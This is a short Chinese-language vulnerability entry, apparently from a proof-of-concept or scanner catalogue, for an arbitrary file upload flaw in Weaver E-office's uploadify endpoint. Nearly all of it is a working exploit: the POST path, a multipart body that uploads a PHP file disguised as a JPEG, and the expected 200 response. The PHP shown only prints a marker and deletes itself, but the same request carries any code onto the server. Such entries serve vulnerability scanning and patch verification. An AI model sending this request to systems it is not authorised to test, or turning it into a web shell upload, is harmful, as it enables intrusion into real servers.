# 泛微E-officeuploadify任意文件上传漏洞

泛微OA ｜ 文件上传 ｜ —
- **请求**：`POST /inc/jquery/uploadify/uploadify.php HTTP/1.1`

**Payload**
```
--e64bdf16c554bbc109cecef6451c26a4
Content-Disposition: form-data; name="Filedata"; filename="2TrZmO0y0SU34qUcUGHA8EXiDgN.php"
Content-Type: image/jpeg
<?php echo "2TrZmO0y0SU34qUcUGHA8EXiDgN";unlink(__FILE__);?>
--e64bdf16c554bbc109cecef6451c26a4--
```
- **响应特征**：200